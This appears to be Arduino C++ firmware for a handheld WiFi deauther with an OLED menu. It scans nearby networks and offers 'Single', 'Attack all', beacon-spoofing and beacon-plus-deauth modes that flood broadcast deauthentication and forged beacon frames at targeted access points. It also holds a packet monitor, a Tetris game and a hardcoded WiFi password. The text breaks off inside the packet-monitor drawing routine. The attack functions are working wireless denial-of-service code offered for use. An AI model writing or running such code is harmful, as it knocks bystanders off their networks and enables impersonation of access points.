// Code by Nguyen The Hoang 
// Profile: https://facebook.com/boysitinh2912 https://github.com/concuchaba2912 https://www.youtube.com/watch?v=dQw4w9WgXcQ
// 90% chat bot AI 10% my code
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
// Misc
#undef max
#undef min
#include <SPI.h>
#include <vector>
#include <map>
#include "debug.h"
#include <Wire.h>
// Display
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
// Pins
#define BTN_DOWN PA27
#define BTN_UP PA12
#define BTN_OK PA13
// VARIABLES
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
} WiFiScanResult;
// Credentials for your WiFi network
char *ssid = "xiaomi 15 ultra";
char *pass = "123456789";
int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;
String SelectedSSID;
String SSIDCh;
// Packet Monitor variables
unsigned long packet_count = 0;
unsigned long last_packet_time = 0;
int packet_rates[20] = {0}; // Circular buffer for waveform
int packet_buffer_index = 0;
bool packet_monitor_running = false;
// Menu and UI
int attackstate = 0;
int menustate = 0;
bool menuscroll = true;
bool okstate = true;
int scrollindex = 0;
int perdeauth = 3;
int page = 0;
// LED RGB
#define LED_BLUE PA14
bool ledState = true;
// Language support
int currentLanguage = 0; // 0: English, 1: Vietnamese
// Timing variables
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;
// Memory optimization
#define MAX_SCAN_RESULTS 20 // Limit number of scan results to save RAM
// Custom max function to avoid <algorithm>
inline int max(int a, int b) {
  return (a > b) ? a : b;
}
// Simple LCG for random numbers
unsigned long lcg_seed = 12345;
inline int lcg_rand(int min, int max) {
  lcg_seed = (1103515245 * lcg_seed + 12345) & 0x7fffffff;
  return min + (lcg_seed % (max - min + 1));
}
// IMAGES
static const unsigned char PROGMEM image_wifi_not_connected__copy__bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };
static const unsigned char PROGMEM image_off_text_bits[] = { 0x67, 0x70, 0x94, 0x40, 0x96, 0x60, 0x94, 0x40, 0x64, 0x40 };
static const unsigned char PROGMEM image_cross_contour_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x80, 0x51, 0x40, 0x8a, 0x20, 0x44, 0x40, 0x20, 0x80, 0x11, 0x00, 0x20, 0x80, 0x44, 0x40, 0x8a, 0x20, 0x51, 0x40, 0x20, 0x80, 0x00, 0x00, 0x00, 0x00 };
static const unsigned char PROGMEM image_language_bits[] = { 0x00, 0x00, 0x3F, 0xFC, 0x20, 0x04, 0x20, 0x04, 0x3F, 0xFC, 0x00, 0x00 }; // Language icon
static const unsigned char PROGMEM icon_5g_bits[] = { 0x00, 0x00, 0x07, 0xC0, 0x08, 0x20, 0x10, 0x10, 0x20, 0x08, 0x20, 0x08, 0x10, 0x10, 0x08, 0x20, 0x07, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // 5G icon
static const unsigned char PROGMEM icon_2_4g_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xC0, 0x04, 0x40, 0x04, 0x40, 0x04, 0x40, 0x07, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // 2.4G icon
static const unsigned char PROGMEM icon_signal_1_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // 1 bar
static const unsigned char PROGMEM icon_signal_2_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // 2 bars
static const unsigned char PROGMEM icon_signal_3_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // 3 bars
static const unsigned char PROGMEM icon_signal_4_bits[] = { 0x00, 0x00, 0x00, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // 4 bars
static const unsigned char PROGMEM icon_packet_bits[] = { 0x00, 0x00, 0x03, 0xC0, 0x04, 0x20, 0x08, 0x10, 0x10, 0x08, 0x20, 0x04, 0x20, 0x04, 0x10, 0x08, 0x08, 0x10, 0x04, 0x20, 0x03, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // Packet icon
// Feature Icons (16x16 pixels)
static const unsigned char PROGMEM icon_attack_bits[] = { 0x00, 0x00, 0x01, 0x00, 0x02, 0x80, 0x04, 0x40, 0x08, 0x20, 0x10, 0x10, 0x20, 0x08, 0x40, 0x04, 0x80, 0x02, 0x40, 0x04, 0x20, 0x08, 0x10, 0x10, 0x08, 0x20, 0x04, 0x40, 0x02, 0x80, 0x00, 0x00 }; // Sword
static const unsigned char PROGMEM icon_scan_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x07, 0xE0, 0x08, 0x10, 0x10, 0x08, 0x20, 0x04, 0x20, 0x04, 0x10, 0x08, 0x08, 0x10, 0x07, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // Magnifying glass
static const unsigned char PROGMEM icon_select_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x1C, 0x00, 0x2E, 0x00, 0x47, 0x00, 0x47, 0x00, 0x2E, 0x00, 0x1C, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // WiFi signal
static const unsigned char PROGMEM icon_info_bits[] = { 0x00, 0x00, 0x07, 0xE0, 0x08, 0x10, 0x08, 0x10, 0x08, 0x10, 0x00, 0x10, 0x00, 0x10, 0x00, 0x10, 0x00, 0x10, 0x00, 0x10, 0x00, 0x10, 0x00, 0x10, 0x00, 0x10, 0x07, 0xE0, 0x00, 0x00 }; // Info "i"
static const unsigned char PROGMEM icon_version_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xF8, 0x20, 0x08, 0x20, 0x08, 0x3F, 0xF8, 0x00, 0x08, 0x00, 0x08, 0x00, 0x08, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00 }; // Version "v"
static const unsigned char PROGMEM icon_settings_bits[] = { 0x00, 0x00, 0x04, 0x40, 0x0E, 0xE0, 0x0E, 0xE0, 0x15, 0x50, 0x15, 0x50, 0x0E, 0xE0, 0x0E, 0xE0, 0x04, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // Gear
static const unsigned char PROGMEM icon_reset_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x07, 0xC0, 0x08, 0x20, 0x10, 0x10, 0x20, 0x08, 0x40, 0x04, 0x40, 0x04, 0x20, 0x08, 0x10, 0x10, 0x08, 0x20, 0x07, 0xC0, 0x00, 0x00, 0x00, 0x00 }; // Circular arrow
static const unsigned char PROGMEM icon_turnoff_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xC0, 0x03, 0xC0, 0x03, 0xC0, 0x03, 0xC0, 0x03, 0xC0, 0x03, 0xC0, 0x03, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // Power button
//static const unsigned char PROGMEM icon_packet_bits[] = {{ 0x00, 0x00, 0x00, 0x00, 0x07, 0xE0, 0x08, 0x10, 0x10, 0x08, 0x20, 0x04, 0x20, 0x04, 0x10, 0x08, 0x08, 0x10, 0x07, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // Packet icon
static const unsigned char PROGMEM icon_tetris_bits[] = { 0x00, 0x00, 0x07, 0xC0, 0x04, 0x40, 0x04, 0x40, 0x1F, 0xF0, 0x10, 0x10, 0x10, 0x10, 0x1F, 0xF0, 0x04, 0x40, 0x04, 0x40, 0x07, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // Tetris icon
// Tetris Game
#define TETRIS_GRID_WIDTH 10
#define TETRIS_GRID_HEIGHT 20
#define CELL_SIZE 3 // Reduced to fit 10x20 grid in 50x60 pixels
#define GRID_X 39 // Center: (128 - 10*5) / 2
#define GRID_Y 2
#define BLOCK_SIZE 5 // Visual size of each block
// Tetromino definitions (4x4 grid, 1=block, 0=empty)
const int8_t tetrominoes[7][4][4] PROGMEM = {
  // I
  {{0,0,0,0}, {1,1,1,1}, {0,0,0,0}, {0,0,0,0}},
  // O
  {{0,0,0,0}, {0,1,1,0}, {0,1,1,0}, {0,0,0,0}},
  // T
  {{0,0,0,0}, {0,1,0,0}, {1,1,1,0}, {0,0,0,0}},
  // S
  {{0,0,0,0}, {0,1,1,0}, {1,1,0,0}, {0,0,0,0}},
  // Z
  {{0,0,0,0}, {1,1,0,0}, {0,1,1,0}, {0,0,0,0}},
  // J
  {{0,0,0,0}, {1,0,0,0}, {1,1,1,0}, {0,0,0,0}},
  // L
  {{0,0,0,0}, {0,0,1,0}, {1,1,1,0}, {0,0,0,0}}
};
struct TetrisPiece {
  int8_t shape[4][4];
  int x, y; // Top-left position on grid
  int type; // 0-6 for tetromino type
};
void TetrisGame() {
  // Game state
  uint8_t grid[TETRIS_GRID_HEIGHT][TETRIS_GRID_WIDTH] = {0};
  TetrisPiece currentPiece;
  int score = 0;
  bool gameOver = false;
  bool running = true;
  unsigned long lastMoveTime = 0;
  unsigned long lastInputTime = 0;
  const unsigned long moveDelay = 500; // Fall every 500ms
  const unsigned long inputDelay = 150; // Debounce inputs
  // Initialize piece
  auto spawnPiece = [&]() {
    currentPiece.type = lcg_rand(0, 6);
    for (int i = 0; i < 4; i++)
      for (int j = 0; j < 4; j++)
        currentPiece.shape[i][j] = pgm_read_byte(&tetrominoes[currentPiece.type][i][j]);
    currentPiece.x = TETRIS_GRID_WIDTH / 2 - 2;
    currentPiece.y = 0;
    // Check for game over
    for (int i = 0; i < 4; i++)
      for (int j = 0; j < 4; j++)
        if (currentPiece.shape[i][j] && grid[currentPiece.y + i][currentPiece.x + j])
          return false;
    return true;
  };

  // Collision detection
  auto checkCollision = [&](int dx, int dy, int8_t shape[4][4]) {
    for (int i = 0; i < 4; i++)
      for (int j = 0; j < 4; j++)
        if (shape[i][j]) {
          int nx = currentPiece.x + j + dx;
          int ny = currentPiece.y + i + dy;
          if (nx < 0 || nx >= TETRIS_GRID_WIDTH || ny >= TETRIS_GRID_HEIGHT || (ny >= 0 && grid[ny][nx]))
            return true;
        }
    return false;
  };

  // Rotate piece
  auto rotatePiece = [&]() {
    int8_t newShape[4][4];
    for (int i = 0; i < 4; i++)
      for (int j = 0; j < 4; j++)
        newShape[j][3-i] = currentPiece.shape[i][j];
    if (!checkCollision(0, 0, newShape))
      for (int i = 0; i < 4; i++)
        for (int j = 0; j < 4; j++)
          currentPiece.shape[i][j] = newShape[i][j];
  };

  // Lock piece and clear lines
  auto lockPiece = [&]() {
    for (int i = 0; i < 4; i++)
      for (int j = 0; j < 4; j++)
        if (currentPiece.shape[i][j])
          grid[currentPiece.y + i][currentPiece.x + j] = 1;
    // Clear full lines
    int linesCleared = 0;
    for (int i = TETRIS_GRID_HEIGHT - 1; i >= 0; i--) {
      bool full = true;
      for (int j = 0; j < TETRIS_GRID_WIDTH; j++)
        if (!grid[i][j]) {
          full = false;
          break;
        }
      if (full) {
        linesCleared++;
        for (int k = i; k > 0; k--)
          for (int j = 0; j < TETRIS_GRID_WIDTH; j++)
            grid[k][j] = grid[k-1][j];
        for (int j = 0; j < TETRIS_GRID_WIDTH; j++)
          grid[0][j] = 0;
        i++; // Recheck this row
      }
    }
    score += linesCleared * 10;
  };

  // Draw game
  auto drawGame = [&]() {
    display.clearDisplay();
    // Draw border
    display.drawRect(GRID_X - 1, GRID_Y - 1, TETRIS_GRID_WIDTH * CELL_SIZE + 2, TETRIS_GRID_HEIGHT * CELL_SIZE + 2, WHITE);
    // Draw grid and locked pieces
    for (int i = 0; i < TETRIS_GRID_HEIGHT; i++)
      for (int j = 0; j < TETRIS_GRID_WIDTH; j++)
        if (grid[i][j])
          display.fillRect(GRID_X + j * CELL_SIZE, GRID_Y + i * CELL_SIZE, CELL_SIZE, CELL_SIZE, WHITE);
    // Draw current piece with glow
    for (int i = 0; i < 4; i++)
      for (int j = 0; j < 4; j++)
        if (currentPiece.shape[i][j]) {
          int px = GRID_X + (currentPiece.x + j) * CELL_SIZE;
          int py = GRID_Y + (currentPiece.y + i) * CELL_SIZE;
          display.fillRect(px, py, CELL_SIZE, CELL_SIZE, WHITE);
          display.drawPixel(px - 1, py, WHITE); // Glow effect
          display.drawPixel(px + CELL_SIZE, py, WHITE);
        }
    // Draw score
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(10, 62);
    display.print(F("Score: "));
    display.print(score);
    // Game over prompt
    if (gameOver) {
      display.setCursor(30, 30);
      display.print(currentLanguage == 0 ? F("Game Over") : F("Ket Thuc"));
      display.setCursor(20, 40);
      display.print(currentLanguage == 0 ? F("OK: Restart") : F("OK: Choi Lai"));
    }
    display.display();
  };

  // Initialize game
  if (!spawnPiece()) {
    gameOver = true;
  }

  while (running) {
    unsigned long currentTime = millis();

    // Handle inputs
    if (currentTime - lastInputTime > inputDelay) {
      if (digitalRead(BTN_OK) == LOW) {
        if (gameOver) {
          // Restart or exit
          memset(grid, 0, sizeof(grid));
          score = 0;
          gameOver = false;
          if (!spawnPiece()) gameOver = true;
        } else {
          // Move left
          if (!checkCollision(-1, 0, currentPiece.shape))
            currentPiece.x--;
        }
        lastInputTime = currentTime;
      }
      if (digitalRead(BTN_UP) == LOW && !gameOver) {
        // Rotate
        rotatePiece();
        lastInputTime = currentTime;
      }
      if (digitalRead(BTN_DOWN) == LOW && !gameOver) {
        // Soft drop
        if (!checkCollision(0, 1, currentPiece.shape))
          currentPiece.y++;
        else {
          lockPiece();
          if (!spawnPiece()) gameOver = true;
        }
        lastInputTime = currentTime;
      }
    }

    // Auto-fall
    if (!gameOver && currentTime - lastMoveTime > moveDelay) {
      if (!checkCollision(0, 1, currentPiece.shape))
        currentPiece.y++;
      else {
        lockPiece();
        if (!spawnPiece()) gameOver = true;
      }
      lastMoveTime = currentTime;
    }

    // Exit on long OK press during game
    if (digitalRead(BTN_OK) == LOW && currentTime - lastInputTime > 1000) {
      running = false;
    }

    drawGame();
    delay(10);
  }
}

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0 && scan_results.size() < MAX_SCAN_RESULTS) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT(F("Scan Wifi(5s)..."));
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(F("Success!\n"));
    return 0;
  } else {
    DEBUG_SER_PRINT(F("Fail!\n"));
    return 1;
  }
}

void Single() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println(F("Single attack..."));
  display.display();
  while (true) {
    memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    deauth_reason = 1;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 4;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 16;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
  }
}

void All() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println(F("Attack all..."));
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < perdeauth; x++) {
        deauth_reason = 1;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 4;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 16;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      }
    }
  }
}

void BecaonDeauth() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println(F("Becaon+Deauth Attack..."));
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      String ssid1 = scan_results[i].ssid;
      const char *ssid1_cstr = ssid1.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 0);
      }
    }
  }
}

void Becaon() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println(F("Becaon Attack..."));
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      String ssid1 = scan_results[i].ssid;
      const char *ssid1_cstr = ssid1.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
      }
    }
  }
}

void PacketMonitor() {
  packet_monitor_running = true;
  packet_count = 0;
  last_packet_time = millis();
  for (int i = 0; i < 20; i++) packet_rates[i] = 0;
  packet_buffer_index = 0;

  while (packet_monitor_running) {
    unsigned long current_time = millis();
    if (current_time - last_packet_time >= 1000) {
      // Perform a quick scan to count APs as a proxy for packet activity
      scan_results.clear();
      wext_set_channel(WLAN0_NAME, current_channel);
      if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
        delay(1000); // Short scan
        packet_rates[packet_buffer_index] = scan_results.size();
        packet_count += scan_results.size();
      } else {
        packet_rates[packet_buffer_index] = 0;
      }
      last_packet_time = current_time;
      packet_buffer_index = (packet_buffer_index + 1) % 20;
    }

    drawPacketMonitorScreen();
    display.display();

    if (digitalRead(BTN_OK) == LOW) {
      delay(150);
      packet_monitor_running = false;
    }
    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      current_channel = (current_channel >= 165) ? 1 : (current_channel < 13 ? current_channel + 1 : 36);
      wext_set_channel(WLAN0_NAME, current_channel);
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      current_channel = (current_channel <= 1) ? 165 : (current_channel > 36 ? current_channel - 1 : 13);
      wext_set_channel(WLAN0_NAME, current_channel);
    }
    delay(50);
  }
}

// Custom UI elements
void drawFrame() {
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
  display.drawRect(2, 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - 4, WHITE);
}

void drawGlowingBorder() {
  static unsigned long lastAnimTime = 0;
  static int animFrame = 0;
  if (millis() - lastAnimTime > 300) {
    animFrame = (animFrame + 1) % 2;
    lastAnimTime = millis();
  }
  if (animFrame == 0) {
    display.drawRect(SCREEN_WIDTH / 2 - 20, 10, 40, 40, WHITE);
  } else {
    display.drawRect(SCREEN_WIDTH / 2 - 22, 8, 44, 44, WHITE);
  }
}

void drawStatusBar(const char *status) {
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(4, 1);
  display.print(status);
  display.drawBitmap(SCREEN_WIDTH - 10, 2, image_language_bits, 6, 6, BLACK);
  display.setCursor(SCREEN_WIDTH - 20, 1);
  display.print(currentLanguage == 0 ? "EN" : "VI");
  display.setTextColor(WHITE);
}

void drawNavBar(int page, int totalPages) {
  display.fillRect(0, SCREEN_HEIGHT - 10, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(SCREEN_WIDTH / 2 - 10, SCREEN_HEIGHT - 9);
  display.print(String(page + 1) + "/" + String(totalPages));
  if (page > 0) {
    display.fillTriangle(10, SCREEN_HEIGHT - 5, 15, SCREEN_HEIGHT - 8, 15, SCREEN_HEIGHT - 2, BLACK);
  }
  if (page < totalPages - 1) {
    display.fillTriangle(SCREEN_WIDTH - 10, SCREEN_HEIGHT - 5, SCREEN_WIDTH - 15, SCREEN_HEIGHT - 8, SCREEN_WIDTH - 15, SCREEN_HEIGHT - 2, BLACK);
  }
  display.setTextColor(WHITE);
}

void drawGradientBackground() {
  for (int y = 10; y < SCREEN_HEIGHT - 10; y += 2) {
    display.drawLine(0, y, SCREEN_WIDTH, y, WHITE);
    display.drawLine(0, y + 1, SCREEN_WIDTH, y + 1, BLACK);
  }
}

// Multilingual menu items
const char *menuItemsEN[] PROGMEM = {
  "Attack", "Scan WiFi", "Select WiFi", "Information",
  "Version", "Settings", "Reset", "Turn Off", "Packet Monitor", "Tetris Game"
};
const char *menuItemsVI[] PROGMEM = {
  "Tan cong", "Quet WiFi", "Chon WiFi", "Thong tin",
  "Phien ban", "Cai dat", "Dat lai", "Tat may", "Giam sat goi tin", "Xep Gach"
};
const unsigned char *featureIcons[] PROGMEM = {
  icon_attack_bits, icon_scan_bits, icon_select_bits, icon_info_bits,
  icon_version_bits, icon_settings_bits, icon_reset_bits, icon_turnoff_bits, icon_packet_bits, icon_tetris_bits
};

void drawMainMenu(int selectedIndex) {
  display.clearDisplay();
  drawStatusBar(currentLanguage == 0 ? "MENU" : "THUC DON");
  drawFrame();
  drawGlowingBorder();

  const char **menuItems = currentLanguage == 0 ? menuItemsEN : menuItemsVI;
  int totalItems = 10; // Updated for Tetris

  // Draw icon with zoom effect
  static int zoomFrame = 0;
  int size = (zoomFrame < 5) ? 12 + zoomFrame : 16;
  int offset = (16 - size) / 2;
  display.drawBitmap(SCREEN_WIDTH / 2 - 8 + offset, 15 + offset, featureIcons[selectedIndex], size, size, WHITE);
  zoomFrame = (zoomFrame + 1) % 10;

  // Draw text
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(SCREEN_WIDTH / 2 - (strlen(menuItems[selectedIndex]) * 6) / 2, 35);
  display.print(menuItems[selectedIndex]);

  drawNavBar(selectedIndex, totalItems);
  display.display();
}

void drawScanScreen() {
  display.clearDisplay();
  drawFrame();
  drawStatusBar(currentLanguage == 0 ? "SCANNING" : "DANG QUET");

  static const char *frames[] = { "/", "-", "\\", "|" };
  for (int i = 0; i < 20; i++) {
    display.setCursor(48, 30);
    display.setTextSize(1);
    display.print(currentLanguage == 0 ? F("Scanning ") : F("Dang quet "));
    display.print(frames[i % 4]);
    display.drawRect(20, 45, SCREEN_WIDTH - 40, 8, WHITE);
    display.fillRect(20, 45, (SCREEN_WIDTH - 40) * i / 20, 8, WHITE);
    display.display();
    delay(200);
  }
}

void drawNetworkList(const String &selectedSSID, int scrollIndex) {
  display.clearDisplay();
  drawStatusBar(currentLanguage == 0 ? "WIFI" : "MANG WIFI");
  drawFrame();
  drawGradientBackground();

  // SSID
  String displaySSID = selectedSSID;
  if (displaySSID.length() > 12) {
    displaySSID = displaySSID.substring(0, 9) + "...";
  }
  display.setTextSize(1);
  display.setTextColor(BLACK, WHITE);
  display.setCursor(SCREEN_WIDTH / 2 - (displaySSID.length() * 6) / 2, 20);
  display.print(displaySSID);
  display.setTextColor(WHITE);

  // Channel Type (5G/2.4G icon)
  if (static_cast<size_t>(scrollIndex) < scan_results.size()) {
    const unsigned char *channelIcon = scan_results[scrollIndex].channel >= 36 ? icon_5g_bits : icon_2_4g_bits;
    display.drawBitmap(SCREEN_WIDTH - 20, 15, channelIcon, 16, 16, WHITE);
  }

  // Animated Signal Strength
  static unsigned long lastAnimTime = 0;
  static int animFrame = 0;
  if (millis() - lastAnimTime > 200) {
    animFrame = (animFrame + 1) % 2;
    lastAnimTime = millis();
  }
  if (static_cast<size_t>(scrollIndex) < scan_results.size()) {
    int rssi = scan_results[scrollIndex].rssi;
    const unsigned char *signalIcon;
    if (rssi >= -50) signalIcon = icon_signal_4_bits;
    else if (rssi >= -70) signalIcon = icon_signal_3_bits;
    else if (rssi >= -90) signalIcon = icon_signal_2_bits;
    else signalIcon = icon_signal_1_bits;
    if (animFrame == 0) {
      display.drawBitmap(10, 35, signalIcon, 16, 16, WHITE);
    } else {
      display.drawBitmap(10, 34, signalIcon, 16, 16, WHITE); // Slight bounce
    }
  }

  // Smooth navigation arrows
  static int arrowAnimFrame = 0;
  if (millis() - lastAnimTime > 150) {
    arrowAnimFrame = (arrowAnimFrame + 1) % 3;
  }
  if (scrollIndex > 0) {
    if (arrowAnimFrame == 0) {
      display.fillTriangle(SCREEN_WIDTH / 2 - 6, 45, SCREEN_WIDTH / 2 - 2, 40, SCREEN_WIDTH / 2 + 2, 45, WHITE);
    } else if (arrowAnimFrame == 1) {
      display.fillTriangle(SCREEN_WIDTH / 2 - 6, 46, SCREEN_WIDTH / 2 - 2, 41, SCREEN_WIDTH / 2 + 2, 46, WHITE);
    } else {
      display.drawTriangle(SCREEN_WIDTH / 2 - 6, 45, SCREEN_WIDTH / 2 - 2, 40, SCREEN_WIDTH / 2 + 2, 45, WHITE);
    }
  }
  if (static_cast<size_t>(scrollIndex) < scan_results.size() - 1) {
    if (arrowAnimFrame == 0) {
      display.fillTriangle(SCREEN_WIDTH / 2 - 6, 50, SCREEN_WIDTH / 2 + 2, 50, SCREEN_WIDTH / 2 - 2, 55, WHITE);
    } else if (arrowAnimFrame == 1) {
      display.fillTriangle(SCREEN_WIDTH / 2 - 6, 51, SCREEN_WIDTH / 2 + 2, 51, SCREEN_WIDTH / 2 - 2, 56, WHITE);
    } else {
      display.drawTriangle(SCREEN_WIDTH / 2 - 6, 50, SCREEN_WIDTH / 2 + 2, 50, SCREEN_WIDTH / 2 - 2, 55, WHITE);
    }
  }

  display.display();
}

void drawPacketMonitorScreen() {
  display.clearDisplay();
  drawStatusBar(currentLanguage == 0 ? "PACKET MONITOR" : "GIAM SAT GOI TIN");
  drawFrame();

  // Oscilloscope grid (4x4)
  for (int x = 0; x <= SCREEN_WIDTH; x += SCREEN_WIDTH / 4) {
    display.drawLine(x, 10, x, 50, WHITE);
  }
  for (int y = 10; y <= 50; y += 10) {
    display.drawLine(0, y, SCREEN_WIDTH, y, WHITE);
  }

  // Waveform
  int max_rate = 0;
  for (int i = 0; i < 20; i++) {
    if (packet_rates[i] > max_rate) max_rate = packet_rates[i];
  }
  max_rate = max(max_rate, 10); // Avoid division by zero
